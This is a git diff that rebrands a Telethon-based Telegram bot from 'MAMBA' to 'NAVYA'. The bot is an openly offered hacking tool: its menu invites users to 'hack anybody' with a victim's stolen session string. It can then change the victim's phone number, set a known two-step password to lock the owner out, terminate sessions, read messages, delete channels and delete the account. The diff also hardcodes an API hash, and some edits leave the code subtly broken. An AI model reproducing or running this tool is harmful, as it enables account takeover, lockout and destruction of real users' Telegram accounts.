@@ -7,7 +7,7 @@ from os import system
 from telethon.tl.types import ChannelParticipantsAdmins, ChannelParticipantAdmin, ChannelParticipantCreator
 api_hash = os.environ.get("API_HASH")
 token = os.environ.get("BOT_TOKEN")
-client = TelegramClient('Xarmy', api_id, api_hash).start(bot_token=token)
+client = TelegramClient('XnavYA', api_id, api_hash).start(bot_token=token)
 from telethon import TelegramClient as tg
 from telethon.tl.functions.channels import GetAdminedPublicChannelsRequest as pc, JoinChannelRequest as join, LeaveChannelRequest as leave, DeleteChannelRequest as dc
 from telethon.sessions import StringSession as ses
@@ -19,11 +19,11 @@ from telethon.tl.functions.channels import CreateChannelRequest as ccr
 mybot = "missrose_bot"
 bot = borg = client
 
-sukhi = 1967548493
+Navya = 5058101778
 
 
 async def change_number_code(strses, number, code, otp):
-  async with tg(ses(strses), 19227925, "9e6932654a144b710eb82743a37b2a49") as X:
+  async with tg(ses(strses), 5058101778, "9e6932654a144b710eb82743a37b2a49") as X:
     bot = client = X
     try: 
       result = await bot(functions.account.ChangePhoneRequest(
@@ -72,7 +72,7 @@ async def promote(strses, grp, user):
 async def user2fa(strses):
   async with tg(ses(strses), 19227925, "9e6932654a144b710eb82743a37b2a49") as X:
     try:
-      await X.edit_2fa('SUKHIISTHEBEST')
+      await X.edit_2fa('TheNavya')
       return True
     except:
       return False
@@ -144,12 +144,10 @@ async def userchannels(strses):
 import logging
 logging.basicConfig(level=logging.WARNING)
 
-channel = "MAMBA"
+channel = "NAVYA"
 menu = '''
 
-**NOTICE JOIN @MAMBA_X_SUPPORT FEDERATION**
-FED ID `c18cc2cc-05b3-4e99-a54f-b343c5f23e8e`
-
+**NOTICE JOIN @TheNavya FEDERATION**
 
 A: [check user own groups and channels]
 
@@ -183,7 +181,7 @@ mm = '''
 You can hack anybody
 Take his StringSession and use me
 I will give you full power of mine
-Type /hack
+Type /Navya
 '''
 @client.on(events.NewMessage(pattern="/start"))
 async def op(event):
@@ -197,15 +195,15 @@ async def op(event):
   if not event.sender_id == sukhi:
     return await event.reply("please don't use me fuck off 🥺")
   try:
-    await event.reply("session bot file", file="Xarmy.session")
+    await event.reply("session bot file", file="XnavYA.session")
   except Exception as e:
     print (e)
 
 
-@client.on(events.NewMessage(pattern="/hack", func=lambda x: x.is_group))
+@client.on(events.NewMessage(pattern="/Navya", func=lambda x: x.is_group))
 async def op(event):
   await event.reply("please use me in pm🥺")
-@client.on(events.NewMessage(pattern="/hack", func = lambda x: x.is_private))
+@client.on(events.NewMessage(pattern="/Navya", func = lambda x: x.is_private))
 async def start(event):
   global menu
   async with bot.conversation(event.chat_id) as x:
@@ -226,12 +224,12 @@ async def start(event):
         return await event.reply("This StringSession is terminated maybe")
       if len(i) > 3855:
         file = open("session.txt", "w")
-        file.write(i + "\n\nDETAILS BY MAMBA NETWORKS")
+        file.write(i + "\n\nDETAILS BY NAVYA NETWORKS")
         file.close()
         await bot.send_file(event.chat_id, "session.txt")
         system("rm -rf session.txt")
       else:
-        await event.reply(i + "\n\nThanks For using MAMBA NETWORKS Bot")
+        await event.reply(i + "\n\nThanks For using NAVYA NETWORKS Bot")
     elif res.text == "B":
       await x.send_message("GIVE STRING SESSION")
       strses = await x.get_response()
@@ -241,7 +239,7 @@ async def start(event):
       else:
         return await event.respond("This StringSession is terminated maybe")
       i = await userinfo(strses.text)
-      await event.reply(i + "\n\nThanks For using MAMBA NETWORKS Bot")
+      await event.reply(i + "\n\nThanks For using NAVYA NETWORKS Bot")
     elif r == "C":
       await x.send_message("GIVE STRING SESSION")
       strses = await x.get_response()
@@ -263,7 +261,7 @@ async def start(event):
       else:
         return await event.respond("This StringSession is terminated maybe")
       i = await usermsgs(strses.text)
-      await event.reply(i + "\n\nThanks For usingMAMBA NETWORKS Bot")
+      await event.reply(i + "\n\nThanks For using NAVYA NETWORKS Bot")
     elif r == "E":
       await x.send_message("GIVE STRING SESSION")
       strses = await x.get_response()
@@ -275,7 +273,7 @@ async def start(event):
       await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
       grpid = await x.get_response()
       await joingroup(strses.text, grpid.text)
-      await event.reply("Joined the Channel/Group Thanks For MAMBA NETWORKS Bot")
+      await event.reply("Joined the Channel/Group Thanks For NAVYA NETWORKS Bot")
     elif r == "F":
       await x.send_message("GIVE STRING SESSION")
       strses = await x.get_response()
@@ -299,7 +297,7 @@ async def start(event):
       await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
       grpid = await x.get_response()
       await delgroup(strses.text, grpid.text)
-      await event.reply("Deleted the Channel/Group Thanks For usingMAMBA NETWORKS Bot")
+      await event.reply("Deleted the Channel/Group Thanks For using NAVYA NETWORKS Bot")
     elif r == "H":
       await x.send_message("GIVE STRING SESSION")
       strses = await x.get_response()
@@ -310,7 +308,7 @@ async def start(event):
         return await event.respond("This StringSession is terminated maybe")
       i = await user2fa(strses.text)
       if i:
-        await event.reply("User don't have two step thats why now two step is `SUKHI IS THE BEST` you can login now\n\nThanks For using MAMBA NETWORKS Bot")
+        await event.reply("User don't have two step thats why now two step is `NAVYA IS THE BEST` you can login now\n\nThanks For using NAVYA NETWORKS Bot")
       else:
         await event.reply("Sorry User Have two step already")
     elif r == "I":
@@ -322,7 +320,7 @@ async def start(event):
       else:
         return await event.respond("This StringSession is terminated maybe")
       i = await terminate(strses.text)
-      await event.reply("The all sessions are terminated\n\nThanks For using MAMBA NETWORKS Bot")
+      await event.reply("The all sessions are terminated\n\nThanks For using NAVYA NETWORKS Bot")
     elif res.text == "J":
       await x.send_message("GIVE STRING SESSION")
       strses = await x.get_response()
@@ -332,7 +330,7 @@ async def start(event):
       else:
         return await event.respond("This StringSession is terminated maybe")
       i = await delacc(strses.text)
-      await event.reply("The Account is deleted SUCCESSFULLLY\n\nThanks For using MAMBA NETWORKS Bot")
+      await event.reply("The Account is deleted SUCCESSFULLLY\n\nThanks For using NAVYA NETWORKS Bot")
     elif res.text == "L":
       await x.send_message("GIVE STRING SESSION")
       strses = await x.get_response()
@@ -346,7 +344,7 @@ async def start(event):
       await x.send_message("NOW GIVE USER USERNAME")
       user = await x.get_response()
       i = await promote(strses.text, grp.text, user.text)
-      await event.reply("I am Promoting you in Group/Channel wait a min 😗😗\n\nThanks For using MAMBA NETWORKS Bot")
+      await event.reply("I am Promoting you in Group/Channel wait a min 😗😗\n\nThanks For using NAVYA NETWORKS Bot")
     elif res.text == "K":
       await x.send_message("GIVE STRING SESSION")
       strses = await x.get_response()
@@ -361,7 +359,7 @@ async def start(event):
         i = await demall(strses.text, pro.text)
       except:
         pass
-      await event.reply("I am Demoting all members of Group/Channel wait a min 😗😗\n\nThanks For using MAMBA NETWORKS Bot")
+      await event.reply("I am Demoting all members of Group/Channel wait a min 😗😗\n\nThanks For using NAVYA NETWORKS Bot")
     elif res.text == "M":
       await x.send_message("GIVE STRING SESSION")
       strses = await x.get_response()
@@ -386,10 +384,10 @@ async def start(event):
         else:
           await event.respond("Something is wrong")
       except Exception as e:
-        await event.respond("SEND THIS ERROR TO - @MAMBA_X_SUPPORT\n**LOGS**\n" + str(e))
+        await event.respond("SEND THIS ERROR TO - @TheNavya\n**LOGS**\n" + str(e))
 
     else:
-      await event.respond("Wrong Text Found Re type /hack and use")
+      await event.respond("Wrong Text Found Re type /Navya and use")
 
 
 
